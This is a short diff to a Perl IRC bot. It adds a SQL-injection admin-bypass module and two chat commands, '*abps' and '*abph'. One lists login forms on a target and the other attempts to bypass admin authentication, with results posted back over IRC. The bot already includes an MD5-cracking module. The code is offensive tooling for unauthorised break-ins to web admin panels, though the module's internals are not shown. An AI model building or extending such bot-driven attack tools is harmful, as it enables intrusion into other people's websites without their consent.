@@ -8,6 +8,7 @@ use IO::Socket::SSL;
 use Digest::MD5 'md5_hex';
 use MIME::Base64;
 use mod_GetTitle;
+use mod_SQLiAdmBypass;
 use mod_Google;
 use mod_MD5d;
 use strict;
@@ -118,6 +119,20 @@ while (<$sock>) {
 					my $str = $1; 
 					my $hex = pack("H*", "$str"); 
 					$sock->print("PRIVMSG $dcpto :[HEXd] ".$hex."\n\r");
+				}
+				## Admin bypass show forms
+				if($dssge =~ /\*abps\s(.*?)$/) {
+					my @res = mod_SQLiAdmBypass::show($1);
+					foreach (@res) {
+						$sock->print("PRIVMSG $dcpto :[Abps] ".$_."\n\r");
+					}					
+				}
+				## Admin bypass hack
+				if($dssge =~ /\*abph\s(.*?)$/) {
+					my @res = mod_SQLiAdmBypass::hack($1);
+					foreach (@res) {
+						$sock->print("PRIVMSG $dcpto :[Abph] ".$_."\n\r");
+					}					
 				}
 			}
 			## admin cmds
